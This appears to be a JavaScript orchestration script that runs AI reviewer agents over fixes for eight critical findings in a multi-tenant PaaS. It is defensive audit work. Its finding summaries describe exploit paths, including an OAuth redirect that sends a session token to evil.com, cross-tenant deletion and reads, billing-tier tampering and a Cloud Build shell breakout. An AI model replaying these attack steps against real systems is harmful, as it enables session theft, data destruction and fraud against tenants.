export const meta = {
  name: 'deployify-critical-fix-review',
  description: 'Verify each applied critical security fix actually closes the defect and breaks nothing',
  phases: [{ title: 'Review', detail: 'two reviewers per critical fix: does-it-fix / does-it-break' }],
}
const REPO = '/Users/asangborkar/Documents/Plexaverse/deployify'
const CRIT = [{"id": "authn-session-1", "t": "GET/DELETE /api/gcp/discover lets any authenticated user delete another tenant's Cloud SQL / Memorystore / Firestore instance", "f": "src/app/api/gcp/discover/route.ts", "l": 98, "fs": "All tenants' managed databases live in ONE shared GCP project (config.gcp.projectId, see src/lib/gcp/cloudsql.ts:846 `const gcpProjectId = projectId || config.gcp.projectId`). Instance names have no tenant prefix \u2014 src/app/api/projects/[id]/storage/route.ts:112 sets `resourceName = name.toLowerCase().replace(/\\s+/g, '-')`, i.e. literally the connector name the user typed (\"prod-db\", \"main-postgres\"). Attacker signs u"}, {"id": "authz-idor-1", "t": "OAuth callback CLI branch redirects the session JWT to an attacker-controlled host (unvalidated `port` -> URL userinfo injection)", "f": "src/app/api/auth/callback/route.ts", "l": 76, "fs": "`port` is taken verbatim from the query string of GET /api/auth/github (src/app/api/auth/github/route.ts:10), stored in the `deployify_cli_context` cookie, and interpolated straight into a redirect URL. Because `port` is never validated as numeric, a value containing `@` moves the real host out of the `localhost` prefix: I confirmed in node that `new URL('http://localhost:1@evil.com/callback?token=SECRET')` yields `h"}, {"id": "authz-idor-2", "t": "Public reverse proxy forwards the browser's `Cookie` header (including `deployify_session`) to tenant-controlled Cloud Run origins", "f": "src/app/api/v1/proxy/[slug]/[[...path]]/route.ts", "l": 124, "fs": "Only `host` and `connection` are stripped; `cookie` is forwarded. The route is reachable directly on the platform's own apex origin at `https://<app>/api/v1/proxy/<slug>/<path>` \u2014 src/proxy.ts treats the apex as `isBaseDomain` (line 75), skips the subdomain rewrite, and falls through to `NextResponse.next()` with no auth gate for `/api/**`. The session cookie is host-only for the apex with `path: '/'` (src/lib/auth.t"}, {"id": "injection-db-1", "t": "Payment verification grants a client-chosen subscription tier; the Razorpay signature only covers orderId|paymentId, not the tier or amount", "f": "src/app/api/billing/verify/route.ts", "l": 19, "fs": "A logged-in user POSTs /api/billing/checkout {tierId:'pro'} and is charged the Pro price of INR 1,500 (src/lib/billing/tiers.ts:45). Razorpay returns razorpay_order_id / razorpay_payment_id / razorpay_signature to the browser. Instead of letting the page handler run (src/app/billing/page.tsx:135-146), the user replays those three values to /api/billing/verify by hand with {\"tierId\":\"enterprise\"}. verifyPaymentSignatu"}, {"id": "secrets-crypto-1", "t": "Firestore Data Lab queries hit Deployify's own platform Firestore (getDb()), not the customer connector \u2014 cross-tenant read of users/projects/audit collections", "f": "src/app/api/projects/[id]/storage/[storageId]/query/route.ts", "l": 854, "fs": "getDb() (src/lib/firebase.ts:53) returns getFirestore(app) \u2014 the platform's own '(default)' Firestore that stores every tenant's data \u2014 and the firestore branch never references storageConfig / the connector's provisioned database at all. Any registered user: (1) creates their own project (they are 'owner'), (2) POSTs to /storage with {\"type\":\"firestore\",\"name\":\"x\",\"connectionString\":\"firestore://dummy\"} (any non-emp"}, {"id": "ops-config-supply-1", "t": "Unvalidated `rootDirectory` bypasses its own sanitizer and breaks out of the Cloud Build heredoc, giving any signed-up user shell in the platform's Cloud Build step", "f": "src/lib/gcp/cloudbuild.ts", "l": 192, "fs": "Any self-signup user creates a project (POST /api/projects, src/app/api/projects/route.ts:75 destructures `rootDirectory = ''` from the body with zero validation \u2014 `grep -n \"test(|/^\" src/app/api/projects/route.ts` returns nothing), or PATCHes an existing one (src/app/api/projects/[id]/route.ts:132 lists 'rootDirectory' in allowedFields and applies no content check). They set rootDirectory to the multi-line value:\n  "}, {"id": "tenancy-data-1", "t": "Project deletion prefix-matches Cloud Run services and destroys other tenants' running services", "f": "src/app/api/projects/[id]/route.ts", "l": 328, "fs": "All tenants' Cloud Run services live in ONE GCP project (config.gcp.projectId) and are named `dfy-<slug>` (src/lib/utils.ts:53-57). Attacker creates a project with body {name: \"a\", repoFullName: <any repo they can read>} -> slug \"a\". They PATCH region to the victim's region (region is in the allowlist at src/app/api/projects/[id]/route.ts:134). They then DELETE /api/projects/<their-own-id>. checkProjectAccess passes "}, {"id": "tenancy-data-2", "t": "Project slugs are only unique per user, but Cloud Run service names and public hostname routing are global", "f": "src/app/api/projects/route.ts", "l": 123, "fs": "`name` is attacker-controlled request-body input (src/app/api/projects/route.ts:35, 119-120) and uniqueness is checked with getProjectBySlug(session.user.id, slug) \u2014 scoped to the attacker's own projects only. Attacker creates a project named exactly like victim tenant's project (slug \"acme-store\"). Two consequences: (1) DEPLOY \u2014 src/lib/gcp/cloudbuild.ts:92 and src/lib/deployment.ts:82 build the Cloud Run service na"}, {"id": "ai-cost-abuse-1", "t": "Tenant-controlled metadata drives project-level IAM role revocation on the shared platform service account (platform-wide DoS)", "f": "src/lib/gcp/remediation-utils.ts", "l": 185, "fs": "`storage.metadata` is a free-form attacker-controlled blob: src/app/api/projects/[id]/storage/route.ts:455 merges the raw request body's metadata into the stored config with no allowlist (`metadata: { ...(storage.metadata || {}), ...(metadata || {}), secretOnly, connectionPoolerEnabled, operationName }` \u2014 note `provisioned`, `projectId` and `excessiveRoles` are NOT overridden by the tail keys, unlike in the POST hand"}]
const BASE = 'ece2cf3'

const SCHEMA = {
  type: 'object',
  properties: {
    closes_defect: { type: 'string', enum: ['fully', 'partially', 'no', 'not-applicable'] },
    bypass: { type: 'string', description: 'A concrete bypass that still works after the fix, or "none found"' },
    breaks_anything: { type: 'boolean', description: 'true if the change breaks an existing caller, data shape, or dev path' },
    breakage_detail: { type: 'string' },
    default_behaviour_changed: { type: 'string', description: 'With no new env vars set, does behaviour change vs before? Say exactly how.' },
    verdict: { type: 'string', enum: ['ship', 'fix-first', 'revert'] },
    reasoning: { type: 'string' },
  },
  required: ['closes_defect', 'bypass', 'breaks_anything', 'breakage_detail', 'default_behaviour_changed', 'verdict', 'reasoning'],
}

const CONTEXT = `Repo: ${REPO}, branch audit/security-hardening. Next.js 16 App Router + React 19 + TS,
Firestore (firebase-admin), GCP Cloud Run/Build/SQL, Razorpay. Live multi-tenant PaaS.
Commit ${BASE} is the PRE-FIX baseline; HEAD has the applied fixes.
Inspect a fix with: git diff ${BASE} HEAD -- <path>   (run it via Bash from ${REPO})
Then read the CURRENT file to judge the end state. 495 unit tests currently pass; eslint is clean.`

const LENSES = [
  { k: 'closes', t: `Your lens: DOES IT ACTUALLY CLOSE THE DEFECT? Re-derive the original exploit against the
POST-fix code. Try to find a bypass that still works: a sibling code path with the same flaw, an
unguarded caller, a flag that defaults to permissive, an encoding/parsing trick that evades a new
check, or a guard placed after the dangerous operation. Set closes_defect honestly.` },
  { k: 'breaks', t: `Your lens: DOES IT BREAK ANYTHING? The hard constraint was that nothing in the live product may
break. Check: existing Firestore documents and encrypted 'enc:iv:tag:ct' blobs still readable; already-issued
7-day JWTs still valid; API response shapes and status codes unchanged (GREP the real callers in
src/components and src/app); MOCK_DB==='true' and NODE_ENV==='development' paths still work; no new
required env var that is unset in production. State precisely what happens with NO new env vars set.` },
]

const out = await pipeline(
  CRIT,
  (f) => parallel(LENSES.map((L) => () => agent(
`${CONTEXT}

CRITICAL FINDING ${f.id}
  ${f.t}
  Original location: ${f.f}${f.l ? ':' + f.l : ''}
  Original failure scenario: ${f.fs}

A fix for this was applied in HEAD. Review it.
${L.t}

Start with: git diff ${BASE} HEAD -- '${f.f}'
Then read the current file and its callers. Be concrete and cite line numbers.`,
    { label: `review:${L.k}:${f.id}`, phase: 'Review', schema: SCHEMA }))
  ).then((v) => {
    const ok = v.filter(Boolean)
    if (!ok.length) return null
    return { id: f.id, title: f.t, file: f.f, reviews: ok,
      worst: ok.some(r => r.verdict === 'revert') ? 'revert'
           : ok.some(r => r.verdict === 'fix-first') ? 'fix-first' : 'ship',
      closes: ok.map(r => r.closes_defect),
      breaks: ok.some(r => r.breaks_anything) }
  })
)
const res = out.filter(Boolean)
return { total: res.length,
  ship: res.filter(r => r.worst === 'ship').map(r => r.id),
  fix_first: res.filter(r => r.worst === 'fix-first').map(r => r.id),
  revert: res.filter(r => r.worst === 'revert').map(r => r.id),
  details: res }

